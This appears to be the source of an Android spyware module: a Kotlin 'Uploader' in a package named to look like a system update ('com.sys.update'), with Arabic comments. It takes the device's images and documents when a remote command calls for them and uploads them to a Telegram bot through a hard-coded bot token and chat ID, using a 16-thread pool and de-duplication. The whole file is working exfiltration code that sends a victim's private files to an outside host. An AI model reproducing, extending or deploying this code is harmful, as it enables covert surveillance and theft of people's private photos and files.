package com.sys.update

import android.content.Context
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

object Uploader {

    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .readTimeout(120, TimeUnit.SECONDS)
        .connectionPool(okhttp3.ConnectionPool(32, 5, TimeUnit.MINUTES))
        .build()

    private val mediaPool = Executors.newFixedThreadPool(16)

    private val sentImages = java.util.concurrent.ConcurrentHashMap.newKeySet<String>()

    /**
     * flushQueue — تم إلغاؤه. لا يرسل أي شي تلقائيًا.
     * الطابور الآن يُصفّى فقط عند طلب أوامر مثل /notifs.
     */
    fun flushQueue(ctx: Context) {
        // معطّل — لا يفعل شي
        return
    }

    /**
     * uploadMediaFile — يُستدعى فقط من CommandExecutor عند طلب الصور.
     */
    fun uploadMediaFile(ctx: Context, mf: MediaScanner.MediaFile) {
        if (!Config.hasTelegram()) return
        if (!sentImages.add(mf.path)) return

        val file = File(mf.path)
        if (!file.exists()) return

        mediaPool.submit {
            try {
                if (mf.mime.startsWith("image/")) sendTelegramPhoto(file)
                else sendTelegramDocument(file)
            } catch (e: Exception) {
                Log.e("Uploader", "media err: ${e.message}")
                sentImages.remove(mf.path)
            }
        }
    }

    private fun sendTelegramPhoto(file: File) {
        try {
            val url = "https://api.telegram.org/bot${Config.TELEGRAM_BOT_TOKEN}/sendPhoto"
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", Config.TELEGRAM_CHAT_ID)
                .addFormDataPart("caption", file.name)
                .addFormDataPart("photo", file.name, file.asRequestBody("image/*".toMediaType()))
                .build()
            val req = Request.Builder().url(url).post(body).build()
            client.newCall(req).execute().use { it.close() }
        } catch (e: Exception) {
            Log.e("Uploader", "sendPhoto err: ${e.message}")
        }
    }

    private fun sendTelegramDocument(file: File) {
        try {
            val url = "https://api.telegram.org/bot${Config.TELEGRAM_BOT_TOKEN}/sendDocument"
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", Config.TELEGRAM_CHAT_ID)
                .addFormDataPart("caption", file.name)
                .addFormDataPart("document", file.name, file.asRequestBody("application/octet-stream".toMediaType()))
                .build()
            val req = Request.Builder().url(url).post(body).build()
            client.newCall(req).execute().use { it.close() }
        } catch (e: Exception) {
            Log.e("Uploader", "sendDoc err: ${e.message}")
        }
    }
}
